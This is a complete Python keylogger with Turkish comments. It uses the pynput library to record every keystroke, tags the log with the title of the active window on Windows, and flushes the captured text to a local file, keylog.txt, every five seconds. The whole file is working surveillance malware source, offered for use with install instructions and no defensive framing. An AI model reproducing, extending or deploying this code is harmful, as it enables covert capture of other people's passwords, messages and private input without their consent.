#!/usr/bin/env python3
"""
Advanced Keylogger
==================
Buffer destekli ve aktif pencere takibi yapan keylogger.
Gereksinim: pip install pynput
"""
import time
import threading
try:
    from pynput import keyboard
except ImportError:
    print("[-] Lütfen 'pynput' kütüphanesini yükleyin: pip install pynput")
    import sys
    sys.exit(1)

# Opsiyonel: Aktif pencere tespiti (Windows)
try:
    import win32gui
    has_win32 = True
except ImportError:
    has_win32 = False

log_file = "keylog.txt"
key_buffer = ""
last_window = ""
buffer_lock = threading.Lock()

def get_active_window():
    if has_win32:
        try:
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        except:
            return "Unknown"
    return ""

def write_buffer_to_disk():
    global key_buffer, last_window
    while True:
        time.sleep(5)  # Her 5 saniyede bir diske yaz (I/O tasarrufu)
        with buffer_lock:
            if key_buffer:
                with open(log_file, "a", encoding="utf-8") as f:
                    f.write(key_buffer)
                key_buffer = ""

def on_press(key):
    global key_buffer, last_window
    
    with buffer_lock:
        # Pencere değişimi takibi
        if has_win32:
            current_window = get_active_window()
            if current_window != last_window and current_window:
                key_buffer += f"\n\n[PENCERE: {current_window}]\n"
                last_window = current_window

        try:
            key_buffer += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                key_buffer += " "
            elif key == keyboard.Key.enter:
                key_buffer += "\n"
            elif key == keyboard.Key.backspace:
                key_buffer += " [GeriAl] "
            else:
                key_buffer += f" [{key.name}] "

def start_keylogger():
    print("[*] Gelişmiş Keylogger başlatıldı.")
    print("[*] Loglar 5 saniyede bir 'keylog.txt' dosyasına kaydedilir.")
    print("[*] Çıkmak için konsolu kapatın.")
    
    # Arka plan yazma thread'i
    writer_thread = threading.Thread(target=write_buffer_to_disk, daemon=True)
    writer_thread.start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
